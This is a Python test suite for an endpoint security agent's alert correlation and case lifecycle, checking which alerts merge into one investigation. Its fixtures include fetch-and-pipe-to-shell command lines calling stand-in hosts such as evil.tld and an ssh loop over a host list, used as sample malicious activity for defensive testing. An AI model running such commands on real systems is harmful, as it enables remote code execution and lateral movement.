#!/usr/bin/env python3
"""Alert correlation and case lifecycle.

Correlation decides which alerts become one investigation. It fails in two directions and they are
not symmetric: failing to group hides an intrusion inside a wall of single alerts, while grouping
too eagerly produces a 200-member "case" that is really a list of everything the machine did that
afternoon. Both directions are tested here, and the boundary cases are the ones that matter — every
over-merge this suite guards against is one that was observed in real data, not invented.

Pure stdlib, like the agent. Run from the repo root:

    python3 -m unittest discover -s tests -v
    python3 tests/test_correlation.py            # same thing, single file
"""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402


# --------------------------------------------------------------------------------------------
# fixtures
# --------------------------------------------------------------------------------------------
def alert(nid, severity="high", ntype="process", mitre=("T1059",), **detail):
    """One alert node, shaped the way build_graph() emits them."""
    return {"id": nid, "type": ntype, "label": detail.get("label") or nid.split(":")[0],
            "severity": severity, "score": 70,
            "reasons": [{"text": "test", "mitre": m} for m in mitre],
            "detail": detail, "triage": {"status": "open"}}


def exec_alert(nid, cmdline, pid=None, ppid=None, severity="high", mitre=("T1059.004",)):
    """An alert from a real-time exec event: the process is already gone, so it has no hash, no
    address and no path — only what it was told to run. This is the shape that could never group."""
    return alert(nid, severity=severity, mitre=mitre, cmdline=cmdline, exe="/bin/zsh",
                 hashes={"status": "n/a"}, via="esf", ephemeral=True, exited=True,
                 pid=pid, ppid=ppid,
                 signature={"category": "apple", "trusted": True})


def cluster(nodes, proc_parent=None, edges=()):
    return agent.correlate_incidents(nodes, {n["id"]: n for n in nodes},
                                     list(edges), proc_parent or {})


def sizes(nodes, **kw):
    return sorted((c["size"] for c in cluster(nodes, **kw)), reverse=True)


# --------------------------------------------------------------------------------------------
class TestAlertsThatBelongTogether(unittest.TestCase):
    """Ties that should produce one investigation."""

    def test_burst_of_execs_sharing_a_fetched_url(self):
        """The reported bug. Seventeen short-lived processes, no hashes, no paths, no live parents —
        the only thing they share is the URL they were fetching. Before the fix this produced
        seventeen single-alert clusters and therefore zero investigations."""
        nodes = [exec_alert("exec:%d:1" % i,
                            "/bin/zsh -c curl -fsSL http://cdn.evil.tld/stage2.sh | sh")
                 for i in range(17)]
        self.assertEqual(sizes(nodes), [17])

    def test_burst_sharing_an_inline_script_payload(self):
        """Same burst shape, no URL: what ties them is the argument to -c. A shell running is not an
        indicator; what the shell was told to run is."""
        payload = "for h in $(cat /tmp/hosts); do ssh $h 'id'; done"
        nodes = [exec_alert("exec:%d:1" % i, "/bin/zsh -c \"%s\"" % payload) for i in range(4)]
        self.assertEqual(sizes(nodes), [4])

    def test_exec_events_chained_by_recorded_parent(self):
        """A shell and the three children it spawned, all exited. The live process table is empty —
        ancestry has to come from the ppid the collector recorded at exec time."""
        nodes = [exec_alert("exec:100:1", "/bin/zsh -i", pid=100, ppid=99),
                 exec_alert("exec:101:1", "/usr/bin/curl http://a.tld/1", pid=101, ppid=100),
                 exec_alert("exec:102:1", "/usr/bin/curl http://b.tld/2", pid=102, ppid=100),
                 exec_alert("exec:103:1", "/usr/bin/curl http://c.tld/3", pid=103, ppid=100)]
        proc_parent = {n["detail"]["pid"]: n["detail"]["ppid"] for n in nodes}
        self.assertEqual(sizes(nodes, proc_parent=proc_parent), [4])

    def test_shared_file_hash(self):
        """The same binary in two places is the same binary."""
        sha = "a" * 64
        nodes = [alert("download:/Users/x/Downloads/a.dmg", ntype="download",
                       path="/Users/x/Downloads/a.dmg", hashes={"sha256": sha}),
                 alert("file:/Users/x/Library/b.dylib", ntype="file",
                       path="/Users/x/Library/b.dylib", hashes={"sha256": sha})]
        self.assertEqual(sizes(nodes), [2])

    def test_shared_public_address(self):
        nodes = [alert("remote:1", ntype="remote", raddr="8.8.8.8", rport="443", public=True),
                 alert("remote:2", ntype="remote", raddr="8.8.8.8", rport="8443", public=True)]
        self.assertEqual(sizes(nodes), [2])

    def test_shared_live_process_ancestor(self):
        """A process tree that is still running groups on ancestry, as it always has."""
        nodes = [alert("proc:200", pid=200, exe="/Users/x/tool", cmdline="tool --a"),
                 alert("proc:201", pid=201, exe="/Users/x/tool", cmdline="tool --b"),
                 alert("proc:202", pid=202, exe="/Users/x/tool", cmdline="tool --c")]
        self.assertEqual(sizes(nodes, proc_parent={200: 1, 201: 200, 202: 201}), [3])


# --------------------------------------------------------------------------------------------
class TestAlertsThatMustStayApart(unittest.TestCase):
    """The dangerous direction. Every case here was seen over-merging on real data."""

    def test_unrelated_commands_stay_separate(self):
        nodes = [exec_alert("exec:%d:1" % i, "/bin/sh -c echo run-%d" % i) for i in range(6)]
        self.assertEqual(sizes(nodes), [1] * 6)

    def test_a_shared_technique_is_not_a_tie(self):
        """Eighty alerts a day carry T1036. If technique were a key, the whole estate would be one
        case — which is why it is deliberately not one."""
        nodes = [exec_alert("exec:%d:1" % i, "/usr/bin/app-%d --serve" % i, mitre=("T1036",))
                 for i in range(10)]
        self.assertEqual(sizes(nodes), [1] * 10)

    def test_a_shared_interpreter_is_not_a_tie(self):
        """Every one of these ran /bin/zsh. So does everything else on the machine."""
        nodes = [alert("proc:%d" % (300 + i), exe="/bin/zsh", cmdline="/bin/zsh",
                       signature={"category": "apple", "trusted": True},
                       hashes={"sha256": "b" * 64}) for i in range(5)]
        self.assertEqual(sizes(nodes), [1] * 5)

    def test_a_shared_application_bundle_is_not_a_tie(self):
        """Observed on real data: one truncated command-line fragment pointing at an app bundle
        appeared in 657 alerts. Correlating on it chains unrelated activity through nothing but a
        shared application."""
        bundle = "/Users/x/Library/Application Support/SomeApp/2.1.274/bin/helper"
        nodes = [alert("proc:%d" % (400 + i), exe=bundle, cmdline="%s --renderer %d" % (bundle, i),
                       severity="low", mitre=("T1036",)) for i in range(12)]
        self.assertEqual(sizes(nodes), [1] * 12)

    def test_a_private_address_is_not_a_tie(self):
        """Two hosts talking to the same LAN gateway are not one incident."""
        nodes = [alert("remote:%d" % i, ntype="remote", raddr="192.168.1.1", rport="53",
                       public=False) for i in range(4)]
        self.assertEqual(sizes(nodes), [1] * 4)

    def test_a_generic_key_past_its_fanout_budget_is_dropped(self):
        """A path shared by twenty alerts is a common location (/tmp, a cache dir), not a campaign.
        The budget for weak keys is deliberately small."""
        nodes = [alert("file:%d" % i, ntype="file", path="/tmp/shared", severity="low")
                 for i in range(20)]
        self.assertEqual(sizes(nodes), [1] * 20)

    def test_a_specific_key_past_the_generic_budget_still_ties(self):
        """The same SHA-256 across twenty alerts IS a campaign. Specific keys get a bigger budget —
        this is the asymmetry that lets the burst group while /tmp does not."""
        sha = "c" * 64
        nodes = [alert("file:%d" % i, ntype="file", path="/tmp/f-%d" % i,
                       hashes={"sha256": sha}) for i in range(20)]
        self.assertEqual(sizes(nodes), [20])


# --------------------------------------------------------------------------------------------
class TestCaseLifecycle(unittest.TestCase):
    """What happens to a case once it exists: what joins it, and what its severity becomes."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="scouter-test-")
        self.triage = agent.TriageStore(path=os.path.join(self.tmp, "triage.json"))
        self.store = agent.IncidentStore(path=os.path.join(self.tmp, "incidents.json"))

    def _snapshot(self, nodes):
        """One pass of what build_graph does: auto-close the noise, correlate, reconcile, resurface."""
        agent.auto_close_low_signal(nodes, self.triage)
        live = [n for n in nodes if n["severity"] != "info"
                and (n.get("triage") or {}).get("status") != "closed"]
        clusters = [c for c in cluster(live) if c["size"] >= 2]
        self.store.reconcile(clusters)
        resurfaced = agent.resurface_low_signal(nodes, self.triage, self.store)
        return resurfaced, (self.store.list() or [{}])[0]

    @staticmethod
    def _burst(n=3):
        return [exec_alert("exec:%d:1" % i, "/bin/zsh -c curl http://evil.tld/x | sh")
                for i in range(n)]

    @staticmethod
    def _noise(n=5):
        """Low-signal alerts: low severity, no rule hit. These are what auto-close is for."""
        return [alert("proc:%d" % (500 + i), severity="low", mitre=("T1036",),
                      exe="/Users/x/App-%d" % i, cmdline="App-%d" % i) for i in range(n)]

    def test_a_lone_alert_is_not_an_investigation(self):
        nodes = self._burst(1)
        _, case = self._snapshot(nodes)
        self.assertEqual(case, {})

    def test_low_signal_noise_auto_closes_and_then_resurfaces_into_the_case(self):
        """Auto-closing is deliberate: low-signal alerts stay out of the queue until something else
        happens. This is that something else — they are the context around the burst."""
        nodes = self._burst(3) + self._noise(5)
        resurfaced, case = self._snapshot(nodes)
        self.assertEqual(resurfaced, 5)
        self.assertEqual(case["size"], 3)            # pinned members land on the next pass
        _, case = self._snapshot(nodes)
        self.assertEqual(case["size"], 8)
        self.assertEqual(case["severity"], "high")   # context does not dilute the verdict
        self.assertIn("T1036", case["techniques"])   # and it brings its techniques with it

    def test_an_analyst_judgement_is_not_resurfaced(self):
        """Auto-closed means "the machine deferred this". Benign means "a human looked and said no".
        Only the first may be pulled back into a case."""
        nodes = self._burst(3) + self._noise(4)
        for n in nodes[3:]:
            self.triage.set(n["id"], "closed", substatus="Benign", ntype=n["type"])
            n["triage"] = {"status": "closed", "substatus": "Benign"}
        resurfaced, _ = self._snapshot(nodes)
        self.assertEqual(resurfaced, 0)

    def test_case_severity_follows_its_worst_member(self):
        """Medium alerts need a rule hit to survive auto-close — a medium flagged only by the
        heuristics is low-signal by definition and never reaches correlation on its own."""
        def det(nid, sev):
            n = exec_alert(nid, "/bin/zsh -c curl http://evil.tld/x", severity=sev)
            n["detail"]["rule_hits"] = [{"id": "b-curlpipe"}]
            return n
        nodes = [det("exec:1:1", "medium"), det("exec:2:1", "medium")]
        _, case = self._snapshot(nodes)
        self.assertEqual(case["severity"], "medium")
        nodes.append(det("exec:3:1", "critical"))
        _, case = self._snapshot(nodes)
        self.assertEqual(case["severity"], "critical")
        self.assertEqual(case["size"], 3)

    def test_membership_is_stable_across_repeated_snapshots(self):
        """A case must converge. Re-running the same snapshot forever should not keep growing it,
        nor keep re-pinning what it already holds."""
        nodes = self._burst(3) + self._noise(5)
        seen = []
        for _ in range(4):
            _, case = self._snapshot(nodes)
            seen.append(case.get("size"))
        self.assertEqual(seen, [3, 8, 8, 8])
        self.assertEqual(len(self.store.list()), 1)   # and it stays ONE case, not four


if __name__ == "__main__":
    unittest.main(verbosity=2)
